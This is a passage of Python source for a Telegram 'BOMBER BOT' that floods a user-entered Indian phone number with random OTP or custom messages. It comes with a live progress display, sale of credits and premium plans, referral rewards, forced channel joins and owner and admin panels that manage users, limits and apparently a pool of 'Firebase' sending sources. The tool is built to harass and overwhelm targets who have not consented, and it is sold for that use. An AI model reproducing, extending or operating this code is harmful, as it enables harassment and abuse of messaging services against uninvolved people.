                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📱 +91{target}\n\n"
                        f"{bar} {pct}%\n\n"
                        f"🟢 Status: Active\n"
                        f"📨 Sent: {cur} / {max_count}\n"
                        f"⚡ Speed: {cur // max(int(time.time() - active_bombings_detail[uid]['started'], 1), 1)}/sec\n\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                    ),
                    reply_markup=stop_kb, parse_mode="Markdown")
            except Exception:
                pass
            
            if cur >= max_count:
                bombing_active[uid] = False
                break
    except Exception as e:
        log.error(f"bomb loop: {e}")
    finally:
        bombing_active[uid] = False
        info = active_bombings_detail.get(uid, {})
        runtime = int(time.time() - info.get("started", time.time()))
        final = request_counts.pop(uid, 0)
        active_bombings_detail.pop(uid, None)
        bombing_threads.pop(str(uid), None)
        
        if not has_admin_access(uid):
            u = get_user(uid)
            if mode == "random":
                update_user(uid, daily_random_bombing=u["daily_random_bombing"] + 1)
            else:
                update_user(uid, daily_custom_bombing=u["daily_custom_bombing"] + 1)
        
        log_activity(uid, "Bombing", f"{mode} on {target} — {final} req")
        
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=progress_msg.message_id,
                text=(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   ✅ COMPLETED\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📱 +91{target}\n\n"
                    f"████████████████████ 100%\n\n"
                    f"📨 Total: {final}\n"
                    f"⏱️ Runtime: {runtime}s\n"
                    f"⚡ Speed: {final // max(runtime, 1)}/sec\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                ),
                parse_mode="Markdown")
        except Exception:
            pass
        
        await asyncio.sleep(2)
        try:
            await send_main_menu(context, chat_id, uid)
        except Exception:
            pass

# ===================== USER PANEL =====================
def user_main_kb(uid):
    kb = [
        [InlineKeyboardButton("🔥 START BOMBING", callback_data="bomb:start",
                              api_kwargs={"style": "success"})],
        [InlineKeyboardButton("💰 WALLET", callback_data="user:wallet",
                              api_kwargs={"style": "primary"}),
         InlineKeyboardButton("💳 RECHARGE", callback_data="user:recharge",
                              api_kwargs={"style": "primary"})],
        [InlineKeyboardButton("🔗 REFER & EARN", callback_data="user:refer",
                              api_kwargs={"style": "success"}),
         InlineKeyboardButton("📜 HISTORY", callback_data="user:history",
                              api_kwargs={"style": "primary"})],
        [InlineKeyboardButton("📊 MY STATS", callback_data="user:stats",
                              api_kwargs={"style": "primary"}),
         InlineKeyboardButton("🛡️ SYSTEM", callback_data="user:system",
                              api_kwargs={"style": "primary"})],
        [InlineKeyboardButton("👨‍💻 DEVELOPER", callback_data="user:dev",
                              api_kwargs={"style": "primary"})],
    ]
    if has_admin_access(uid):
        kb.append([InlineKeyboardButton("🔐 ADMIN PANEL", callback_data="adm:main",
                                        api_kwargs={"style": "danger"})])
    return InlineKeyboardMarkup(kb)

def welcome_text(uid):
    u = get_user(uid)
    if not u:
        create_user(uid); u = get_user(uid)
    if is_owner(uid):
        role, level, expires = "🔐 OWNER", "4 (Owner)", "Lifetime"
    elif is_admin(uid):
        role, level, expires = "👮 ADMIN", "3 (Admin)", "Lifetime"
    elif u["is_premium"]:
        role, level = "💎 PREMIUM", "2 (Premium)"
        exp = u.get("access_expires_at", 0) or 0
        if exp > 0:
            rem = int(exp - time.time())
            expires = f"{rem // 86400}d {(rem % 86400) // 3600}h left" if rem > 0 else "Expired"
        else:
            expires = "Never"
    else:
        role, level, expires = "👤 USER", "1 (Free)", "Lifetime"
    name = u.get("first_name") or "User"
    fc = u.get("free_credits", 0)
    pc = u.get("premium_credits", 0)
    r_rand = get_remaining(uid, "random")
    r_cust = get_remaining(uid, "custom")
    return (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "   🤖 BOMBER BOT\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Welcome back, {name} [{role}]\n"
        f"UID ▸ `{uid}`\n\n"
        f"💎 Access ▸ {level}\n"
        f"⌛ Expires ▸ {expires}\n"
        f"🛰️ Engine ▸ 🟢 Armed\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💰 Credits:\n   🆓 Free: {fc}\n   💎 Premium: {pc}\n\n"
        f"📊 Remaining Today:\n   🔢 Random: {r_rand}\n   ✏️ Custom: {r_cust}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "👑 By Warrior X Technical White Hat\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

async def send_main_menu(context, chat_id, uid):
    await safe_send(context.bot, chat_id, welcome_text(uid),
                    reply_markup=user_main_kb(uid), parse_mode="Markdown")

# ===================== FORCE JOIN =====================
def _recently_verified(uid):
    with _join_lock:
        t = _join_cache.get(uid)
        return bool(t and (time.time() - t) < 300)

def _mark_verified(uid):
    with _join_lock:
        _join_cache[uid] = time.time()

async def check_force_join(context, uid):
    if has_admin_access(uid): return True
    if _recently_verified(uid): return True
    channels = get_force_channels()
    if not channels: return True
    for ch in channels:
        try:
            m = await context.bot.get_chat_member(chat_id=ch["id"], user_id=uid)
            if m.status not in ("creator", "administrator", "member"):
                return False
        except Exception:
            return False
    _mark_verified(uid); return True

def join_keyboard():
    btns = []
    for ch in get_force_channels():
        if ch.get("url"):
            btns.append([InlineKeyboardButton(f"📢 JOIN {ch['label']}", url=ch["url"],
                                              api_kwargs={"style": "primary"})])
    btns.append([InlineKeyboardButton("✅ VERIFY", callback_data="join_check",
                                      api_kwargs={"style": "success"})])
    return InlineKeyboardMarkup(btns)

async def prompt_join(msg):
    txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
           "   🔐 CHANNEL VERIFICATION\n"
           "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
           "Join our official channel first.\n\n"
           "👇 Steps:\n"
           "1. Click 📢 JOIN CHANNEL\n"
           "2. Join\n"
           "3. Come back and click VERIFY\n\n"
           "━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    kb = join_keyboard()
    if hasattr(msg, "edit_message_text"):
        try:
            await msg.edit_message_text(txt, reply_markup=kb); return
        except Exception: pass
    try:
        await msg.reply_text(txt, reply_markup=kb)
    except Exception: pass

# ===================== HANDLERS =====================
async def start(update, context):
    async with _user_semaphore:
        try:
            u = update.effective_user
            uid = u.id
            if is_banned(uid):
                await update.message.reply_text(
                    f"🚫 *ACCESS DENIED*\n\n📌 Contact: {SUPPORT_USERNAME}",
                    parse_mode="Markdown")
                return
            create_user(uid, u.username or "", u.first_name or "")
            check_daily_reset(uid)
            if get_config("maintenance", "0") == "1" and not has_admin_access(uid):
                await update.message.reply_text(
                    f"🛠️ *MAINTENANCE MODE*\n\nBack soon!\n\n"
                    f"📢 {CHANNEL_USERNAME}\n💬 {SUPPORT_USERNAME}",
                    parse_mode="Markdown")
                return
            if context.args and context.args[0].startswith("ref_"):
                try:
                    ref_id = int(context.args[0][4:])
                    if ref_id != uid:
                        ref_user = get_user(ref_id)
                        me = get_user(uid)
                        if ref_user and me and not me.get("referrer_id"):
                            update_user(ref_id,
                                free_credits=ref_user["free_credits"] + 5,
                                referral_count=ref_user.get("referral_count", 0) + 1)
                            update_user(uid, referrer_id=ref_id)
                            try:
                                await context.bot.send_message(ref_id,
                                    f"🎉 *REFERRAL SUCCESS*\n\n👤 @{u.username or uid} joined!\n💰 +5 Credits",
                                    parse_mode="Markdown")
                            except Exception: pass
                except Exception: pass
            if not await check_force_join(context, uid):
                await prompt_join(update.message); return
            await send_main_menu(context, update.message.chat_id, uid)
        except Exception as e:
            log.error(f"start error: {e}")

async def join_callback(update, context):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if q.data == "join_check":
        _join_cache.pop(uid, None)
        if await check_force_join(context, uid):
            await q.answer("✅ Verified!", show_alert=True)
            try: await q.edit_message_text("✅ VERIFIED", parse_mode="Markdown")
            except Exception: pass
            await asyncio.sleep(0.5)
            await send_main_menu(context, q.message.chat_id, uid)
        else:
            await q.answer("❌ Not joined!", show_alert=True)

async def cancel_cmd(update, context):
    context.user_data.clear()
    await update.message.reply_text("❌ Cancelled.")

async def user_callback(update, context):
    async with _user_semaphore:
        try:
            q = update.callback_query
            await q.answer()
            uid = q.from_user.id
            data = q.data
            if is_banned(uid):
                await q.edit_message_text("🚫 Banned."); return
            
            if data == "bomb:start":
                kb = InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔢 RANDOM OTP", callback_data="bomb_type:random",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("✏️ CUSTOM MESSAGE", callback_data="bomb_type:custom",
                                          api_kwargs={"style": "primary"})],
                    [InlineKeyboardButton("❌ CANCEL", callback_data="bomb_type:cancel",
                                          api_kwargs={"style": "danger"})],
                ])
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   🎯 SELECT BOMBING TYPE\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Choose one:", reply_markup=kb)
                return
            
            if data == "bomb_type:cancel":
                await q.edit_message_text(welcome_text(uid),
                    reply_markup=user_main_kb(uid), parse_mode="Markdown")
                return
            
            if data.startswith("bomb_type:"):
                mode = data.split(":")[1]
                rem = get_remaining(uid, mode)
                if rem <= 0:
                    await q.edit_message_text(
                        f"⚙️ *LIMIT REACHED*\n\n_{mode} limit over_",
                        parse_mode="Markdown"); return
                context.user_data["bomb_mode"] = mode
                context.user_data["awaiting_target"] = True
                title = "🔢 RANDOM OTP" if mode == "random" else "✏️ CUSTOM"
                await q.edit_message_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   {title} BOMBING\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"Send target number:\n📱 Format: 9876543210\n\n"
                    f"Remaining: {rem}\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("❌ CANCEL", callback_data="bomb_type:cancel",
                                              api_kwargs={"style": "danger"})],
                    ]))
                return
            
            if data == "bomb:stop":
                if bombing_active.get(uid):
                    bombing_active[uid] = False
                    await q.answer("🛑 Stopped", show_alert=False)
                    cur = request_counts.get(uid, 0)
                    try:
                        await q.edit_message_text(
                            f"🛑 *STOPPED*\n\n📨 Sent: {cur}",
                            parse_mode="Markdown")
                    except Exception: pass
                    await asyncio.sleep(1.5)
                    await send_main_menu(context, q.message.chat_id, uid)
                else:
                    await q.answer("No active bombing.", show_alert=True)
                return
            
            if data == "user:wallet":
                u = get_user(uid)
                await q.edit_message_text(
                    f"💰 *WALLET*\n\n🆓 Free: {u['free_credits']}\n💎 Premium: {u['premium_credits']}\n\n"
                    f"🔢 Random: {get_remaining(uid,'random')}\n✏️ Custom: {get_remaining(uid,'custom')}",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            if data == "user:recharge":
                kb = InlineKeyboardMarkup([
                    [InlineKeyboardButton("💳 10 Credits — ₹20", callback_data="rc:10",
                                          api_kwargs={"style": "primary"})],
                    [InlineKeyboardButton("💎 25 Credits — ₹50 ⭐", callback_data="rc:25",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("🚀 50 Credits — ₹100", callback_data="rc:50",
                                          api_kwargs={"style": "primary"})],
                    [InlineKeyboardButton("👑 100 Credits — ₹200", callback_data="rc:100",
                                          api_kwargs={"style": "primary"})],
                    [InlineKeyboardButton("⚡ 1 Month Premium — ₹300", callback_data="rc:month1",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("🔥 3 Months Premium — ₹700", callback_data="rc:month3",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                          api_kwargs={"style": "danger"})],
                ])
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   💳 RECHARGE PLANS\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Select:", reply_markup=kb)
                return
            
            if data.startswith("rc:"):
                plan = data.split(":")[1]
                plans = {"10":("10 Credits","₹20"),"25":("25 Credits","₹50"),
                         "50":("50 Credits","₹100"),"100":("100 Credits","₹200"),
                         "month1":("1 Month Premium","₹300"),"month3":("3 Months Premium","₹700")}
                name, price = plans.get(plan, ("Unknown","₹0"))
                await q.edit_message_text(
                    f"💳 *{name}*\n💵 {price}\n\n📱 DM: {SUPPORT_USERNAME}",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("📱 CONTACT", url=SUPPORT_LINK,
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="user:recharge",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            if data == "user:refer":
                bot_username = (await context.bot.get_me()).username
                u = get_user(uid)
                link = f"https://t.me/{bot_username}?start=ref_{uid}"
                await q.edit_message_text(
                    f"🔗 *REFER*\n\n`{link}`\n\n📊 {u.get('referral_count',0)} refs\n💰 {u.get('referral_count',0)*5} credits\n\n"
                    f"🎁 1 ref = 5 credits",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            if data == "user:history":
                rows = get_activity(uid, 10)
                txt = "📜 *HISTORY*\n\n" + ("\n".join(f"• {a} — {d}" for a,d,_ in rows) if rows else "_Empty_")
                await q.edit_message_text(txt, parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            if data == "user:stats":
                u = get_user(uid)
                await q.edit_message_text(
                    f"📊 *MY STATS*\n\n👤 {u.get('first_name','User')}\n🆔 `{uid}`\n"
                    f"📅 {u.get('joined_at','')[:10]}\n"
                    f"💎 {'Yes' if u['is_premium'] else 'No'}\n"
                    f"🔗 {u.get('referral_count',0)}",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            if data == "user:system":
                await q.edit_message_text(
                    "🛡️ *SYSTEM*\n\n✅ ONLINE",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            if data == "user:dev":
                await q.edit_message_text(
                    f"👨‍💻 *DEVELOPER*\n\n👑 Warrior X TWH\n\n"
                    f"💬 {SUPPORT_USERNAME}\n📢 {CHANNEL_USERNAME}",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("💬 CONTACT", url=SUPPORT_LINK,
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            if data == "user:back":
                await q.edit_message_text(welcome_text(uid),
                    reply_markup=user_main_kb(uid), parse_mode="Markdown")
                return
        except Exception as e:
            log.error(f"user_callback: {e}")

async def handle_text(update, context):
    async with _user_semaphore:
        try:
            uid = update.effective_user.id
            text = (update.message.text or "").strip()
            if is_banned(uid): return
            if await handle_admin_input(update, context): return
            check_daily_reset(uid)
            if not await check_force_join(context, uid):
                await prompt_join(update.message); return
            if context.user_data.get("awaiting_target"):
                mode = context.user_data.get("bomb_mode")
                if text.isdigit() and len(text) == 10:
                    if is_protected(text) or is_blacklisted(text):
                        await update.message.reply_text("🛡️/⛔ Blocked number.")
                        context.user_data.clear(); return
                    context.user_data["target"] = text
                    if mode == "random":
                        context.user_data.pop("awaiting_target", None)
                        await update.message.reply_text(f"✅ Target: {text}\n⏳ Starting...")
                        asyncio.create_task(start_bombing(uid, text, context, "random"))
                    else:
                        context.user_data["awaiting_message"] = True
                        context.user_data.pop("awaiting_target", None)
                        await update.message.reply_text(
                            "✏️ Type your message:\n💡 Use `{otp}` for random OTP",
                            parse_mode="Markdown")
                else:
                    await update.message.reply_text("❌ 10-digit number.")
                return
            if context.user_data.get("awaiting_message"):
                if not text: return
                target = context.user_data.get("target")
                context.user_data["custom_message"] = text
                context.user_data.pop("awaiting_message", None)
                await update.message.reply_text("✅ Starting...")
                asyncio.create_task(start_bombing(uid, target, context, "custom"))
                return
        except Exception as e:
            log.error(f"handle_text: {e}")

# ===================== ADMIN =====================
def owner_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 DASHBOARD", callback_data="adm:dashboard", api_kwargs={"style":"primary"}),
         InlineKeyboardButton("🛰️ LIVE", callback_data="adm:live", api_kwargs={"style":"primary"})],
        [InlineKeyboardButton("👥 USERS", callback_data="adm:users", api_kwargs={"style":"primary"}),
         InlineKeyboardButton("🚫 BAN", callback_data="adm:ban_menu", api_kwargs={"style":"danger"})],
        [InlineKeyboardButton("💎 PREMIUM", callback_data="adm:prem_menu", api_kwargs={"style":"success"}),
         InlineKeyboardButton("💰 CREDITS", callback_data="adm:credits_menu", api_kwargs={"style":"success"})],
        [InlineKeyboardButton("🛰️ FIREBASES", callback_data="adm:fb_menu", api_kwargs={"style":"primary"}),
         InlineKeyboardButton("⚙️ LIMITS", callback_data="adm:limits_menu", api_kwargs={"style":"primary"})],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="adm:bc_all", api_kwargs={"style":"success"}),
         InlineKeyboardButton("📢 CHANNELS", callback_data="adm:channels_menu", api_kwargs={"style":"primary"})],
        [InlineKeyboardButton("🔧 MAINTENANCE", callback_data="adm:maintenance", api_kwargs={"style":"danger"})],
        [InlineKeyboardButton("🔄 REFRESH", callback_data="adm:main", api_kwargs={"style":"primary"})],
    ])

def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚫 BAN", callback_data="adm:ban_add", api_kwargs={"style":"danger"})],
        [InlineKeyboardButton("✅ UNBAN", callback_data="adm:ban_remove", api_kwargs={"style":"success"})],
        [InlineKeyboardButton("💰 GIVE CREDITS", callback_data="adm:give_credits", api_kwargs={"style":"success"})],
        [InlineKeyboardButton("➖ REMOVE CREDITS", callback_data="adm:remove_credits", api_kwargs={"style":"danger"})],
        [InlineKeyboardButton("💎 ADD PREMIUM", callback_data="adm:prem_add", api_kwargs={"style":"success"})],
        [InlineKeyboardButton("❌ REMOVE PREMIUM", callback_data="adm:prem_del", api_kwargs={"style":"danger"})],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="adm:bc_all", api_kwargs={"style":"success"})],
        [InlineKeyboardButton("🔄 REFRESH", callback_data="adm:main", api_kwargs={"style":"primary"})],
    ])

def back_kb(t="adm:main"):
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data=t,
                                                        api_kwargs={"style":"primary"})]])

async def admin_callback(update, context):
    async with _user_semaphore:
        try:
            q = update.callback_query
            await q.answer()
            uid = q.from_user.id
            if not has_admin_access(uid):
                await q.edit_message_text("⛔ Denied."); return
            a = q.data[4:] if q.data.startswith("adm:") else ""
            owner_only = ["dashboard","live","users","fb_menu","fb_add","fb_refresh",
                          "limits_menu","set:","channels_menu","add_channel","maintenance",
                          "stats","prot_menu","prot_add","prot_remove","stop","stopall"]
            if any(a.startswith(o) for o in owner_only) and not is_owner(uid):
                await q.answer("⛔ Owner only!", show_alert=True); return
            
            if a == "main":
                kb = owner_kb() if is_owner(uid) else admin_kb()
                txt = "🔐 *ADMIN* — Full" if is_owner(uid) else "👮 *ADMIN* — Limited"
                await q.edit_message_text(txt, reply_markup=kb, parse_mode="Markdown")
                return
            
            if a == "dashboard":
                conn = db(); c = conn.cursor()
                c.execute("SELECT COUNT(*) FROM users"); u_cnt = c.fetchone()[0]
                c.execute("SELECT COUNT(*) FROM users WHERE is_premium = 1"); p_cnt = c.fetchone()[0]
                c.execute("SELECT COUNT(*) FROM banned_users"); b_cnt = c.fetchone()[0]
                conn.close()
                active = sum(1 for v in bombing_active.values() if v)
                await q.edit_message_text(
                    f"📊 *DASHBOARD*\n\n👥 Users: `{u_cnt}`\n💎 Premium: `{p_cnt}`\n"
                    f"🚫 Banned: `{b_cnt}`\n⚡ Active: `{active}`\n🛰️ FB: `{len(get_firebases())}`",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄", callback_data="adm:dashboard", api_kwargs={"style":"primary"})],
                        [InlineKeyboardButton("🔙", callback_data="adm:main", api_kwargs={"style":"primary"})],
                    ]), parse_mode="Markdown")
                return
            
            if a == "live":
                if not active_bombings_detail:
                    await q.edit_message_text("🔴 None.",
                        reply_markup=back_kb("adm:main")); return
                txt = "🛰️ *LIVE*\n\n"; btns = []
                for i,(bu,info) in enumerate(active_bombings_detail.items(),1):
                    rt = int(time.time() - info["started"])
                    txt += f"{i}. `{bu}` | `{info['mode']}` | {info['requests']} | {rt}s\n"
                    btns.append([InlineKeyboardButton(f"⛔ STOP {bu}",
                                                      callback_data=f"adm:stop:{bu}",
                                                      api_kwargs={"style":"danger"})])
                btns.append([InlineKeyboardButton("⛔ ALL", callback_data="adm:stopall",
                                                   api_kwargs={"style":"danger"})])
                btns.append([InlineKeyboardButton("🔙", callback_data="adm:main",
                                                   api_kwargs={"style":"primary"})])
                await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(btns),
                                          parse_mode="Markdown")
                return
            
            if a.startswith("stop:"):
                tu = int(a.split(":")[1])
                if bombing_active.get(tu): bombing_active[tu] = False
                await q.edit_message_text(f"⛔ Stopped {tu}",
                    reply_markup=back_kb("adm:live"), parse_mode="Markdown"); return
            if a == "stopall":
                n = 0
                for bu in list(bombing_active.keys()):
                    if bombing_active.get(bu): bombing_active[bu] = False; n += 1
                await q.edit_message_text(f"⛔ Stopped {n}",
                    reply_markup=back_kb("adm:live"), parse_mode="Markdown"); return
            
            if a == "users":
                conn = db(); c = conn.cursor()
                c.execute("SELECT user_id, username, is_premium FROM users ORDER BY joined_at DESC LIMIT 20")
                rows = c.fetchall(); conn.close()
                txt = "👥 *USERS*\n\n" + "\n".join(f"`{u}` @{un or '-'} {'💎' if p else '👤'}"
                                                  for u,un,p in rows)
                await q.edit_message_text(txt, reply_markup=back_kb(), parse_mode="Markdown")
                return
            
            if a == "ban_menu":
                await q.edit_message_text("🚫 *BAN*",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("➕ BAN", callback_data="adm:ban_add",
                                              api_kwargs={"style":"danger"})],
                        [InlineKeyboardButton("❌ UNBAN", callback_data="adm:ban_remove",
                                              api_kwargs={"style":"success"})],
                        [InlineKeyboardButton("🔙", callback_data="adm:main",
                                              api_kwargs={"style":"primary"})],
                    ]), parse_mode="Markdown"); return
            if a == "ban_add":
                context.user_data["admin_action"] = "ban_add"
                await q.edit_message_text("Send user ID:"); return
            if a == "ban_remove":
                context.user_data["admin_action"] = "ban_remove"
                await q.edit_message_text("Send user ID:"); return
            
            if a == "prem_menu":
                await q.edit_message_text("💎 *PREMIUM*",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("➕ ADD", callback_data="adm:prem_add",
                                              api_kwargs={"style":"success"})],
                        [InlineKeyboardButton("❌ REMOVE", callback_data="adm:prem_del",
                                              api_kwargs={"style":"danger"})],
                        [InlineKeyboardButton("🔙", callback_data="adm:main",
                                              api_kwargs={"style":"primary"})],
                    ]), parse_mode="Markdown"); return
            if a == "prem_add":
                context.user_data["admin_action"] = "prem_add"
                await q.edit_message_text("Send user ID:"); return
            if a == "prem_del":
                context.user_data["admin_action"] = "prem_del"
                await q.edit_message_text("Send user ID:"); return
            
            if a == "credits_menu":
                await q.edit_message_text("💰 *CREDITS*",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("➕ GIVE", callback_data="adm:give_credits",
                                              api_kwargs={"style":"success"})],
                        [InlineKeyboardButton("➖ REMOVE", callback_data="adm:remove_credits",
                                              api_kwargs={"style":"danger"})],
                        [InlineKeyboardButton("🔙", callback_data="adm:main",
                                              api_kwargs={"style":"primary"})],
                    ]), parse_mode="Markdown"); return
            if a == "give_credits":
                context.user_data["admin_action"] = "give_credits"
                await q.edit_message_text("Send: `<user_id> <credits>`", parse_mode="Markdown"); return
            if a == "remove_credits":
                context.user_data["admin_action"] = "remove_credits"
                await q.edit_message_text("Send: `<user_id> <credits>`", parse_mode="Markdown"); return
            
            if a == "fb_menu":
                fbs = get_firebases()
                txt = f"🛰️ *FIREBASES*\n\nTotal: `{len(fbs)}`\n\n"
                for fb in fbs[:15]:
                    cache = firebase_cache.get(fb["tag"], {})
                    txt += f"`{fb['tag']}` — 🟢{cache.get('online',0)} 🔴{cache.get('offline',0)} 📊{cache.get('total',0)}\n"
                await q.edit_message_text(txt,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("➕ ADD", callback_data="adm:fb_add",
                                              api_kwargs={"style":"success"})],
                        [InlineKeyboardButton("🔄 REFRESH", callback_data="adm:fb_refresh",
                                              api_kwargs={"style":"primary"})],
                        [InlineKeyboardButton("🔙", callback_data="adm:main",
                                              api_kwargs={"style":"primary"})],
                    ]), parse_mode="Markdown"); return
            if a == "fb_add":
                context.user_data["admin_action"] = "add_firebase"
                await q.edit_message_text("Send Firebase URL:"); return
            if a == "fb_refresh":
                await q.edit_message_text("⏳ Refreshing...")
                for fb in get_firebases():
                    s = fetch_firebase_stats(fb["url"])
                    if s: firebase_cache[fb["tag"]] = s
                await q.edit_message_text("✅ Refreshed!", reply_markup=back_kb("adm:fb_menu"))
                return
            
            if a == "limits_menu":
                txt = (f"⚙️ *LIMITS*\n\n"
                       f"🔢 Free Random: `{get_config('free_random_bombing')}`\n"
                       f"🔢 Prem Random: `{get_config('premium_random_bombing')}`\n"
                       f"✏️ Free Custom: `{get_config('free_custom_bombing')}`\n"
                       f"✏️ Prem Custom: `{get_config('premium_custom_bombing')}`\n")
                await q.edit_message_text(txt,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔢 FREE RANDOM", callback_data="adm:set:free_random_bombing", api_kwargs={"style":"primary"})],
                        [InlineKeyboardButton("🔢 PREM RANDOM", callback_data="adm:set:premium_random_bombing", api_kwargs={"style":"primary"})],
                        [InlineKeyboardButton("✏️ FREE CUSTOM", callback_data="adm:set:free_custom_bombing", api_kwargs={"style":"primary"})],
                        [InlineKeyboardButton("✏️ PREM CUSTOM", callback_data="adm:set:premium_custom_bombing", api_kwargs={"style":"primary"})],
                        [InlineKeyboardButton("🔙", callback_data="adm:main", api_kwargs={"style":"primary"})],
                    ]), parse_mode="Markdown"); return
            if a.startswith("set:"):
                key = a.split(":",1)[1]
                context.user_data["admin_action"] = f"set_config:{key}"
                await q.edit_message_text(f"Send value for `{key}`:", parse_mode="Markdown"); return
            
            if a == "bc_all":
                context.user_data["admin_action"] = "bc_all"
                await q.edit_message_text("Send broadcast:"); return
            
            if a == "channels_menu":
                chs = get_force_channels()
                txt = "📢 *CHANNELS*\n\n" + ("\n".join(f"• {c['label']}" for c in chs) if chs else "_None_")
                await q.edit_message_text(txt,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("➕ ADD", callback_data="adm:add_channel", api_kwargs={"style":"success"})],
                        [InlineKeyboardButton("🔙", callback_data="adm:main", api_kwargs={"style":"primary"})],
                    ]), parse_mode="Markdown"); return
            if a == "add_channel":
                context.user_data["admin_action"] = "add_channel"
                await q.edit_message_text("Send channel @username:"); return
            
            if a == "maintenance":
                cur = get_config("maintenance","0")
                new = "0" if cur == "1" else "1"
                set_config("maintenance", new)
                st = "🟢 ON" if new == "0" else "🔴 OFF"
                await q.edit_message_text(f"🔧 *MAINTENANCE*\n\n{st}",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄", callback_data="adm:maintenance", api_kwargs={"style":"danger"})],
                        [InlineKeyboardButton("🔙", callback_data="adm:main", api_kwargs={"style":"primary"})],
                    ]), parse_mode="Markdown"); return
        except Exception as e:
            log.error(f"admin_callback: {e}")

async def handle_admin_input(update, context):
    uid = update.effective_user.id
    text = (update.message.text or "").strip()
    action = context.user_data.get("admin_action")
    if not action or not has_admin_access(uid): return False
    try:
        if action == "ban_add" and text.isdigit():
            conn = db(); c = conn.cursor()
            c.execute("INSERT OR IGNORE INTO banned_users (user_id) VALUES (?)", (int(text),))
            conn.commit(); conn.close()
            await update.message.reply_text(f"✅ Banned {text}")
            context.user_data.pop("admin_action", None); return True
        if action == "ban_remove" and text.isdigit():
            conn = db(); c = conn.cursor()
            c.execute("DELETE FROM banned_users WHERE user_id = ?", (int(text),))
            conn.commit(); conn.close()
            await update.message.reply_text(f"✅ Unbanned {text}")
            context.user_data.pop("admin_action", None); return True
        if action == "prem_add" and text.isdigit():
            update_user(int(text), is_premium=1, premium_type="admin")
            await update.message.reply_text(f"✅ Premium: {text}")
            context.user_data.pop("admin_action", None); return True
        if action == "prem_del" and text.isdigit():
            update_user(int(text), is_premium=0)
            await update.message.reply_text(f"✅ Removed: {text}")
            context.user_data.pop("admin_action", None); return True
        if action == "give_credits":
            p = text.split()
            if len(p) != 2: return True
            tu, amt = int(p[0]), int(p[1])
            u = get_user(tu)
            if not u: return True
            update_user(tu, premium_credits=u["premium_credits"]+amt, is_premium=1, premium_type="credits")
            await update.message.reply_text(f"✅ +{amt} to {tu}")
            context.user_data.pop("admin_action", None); return True
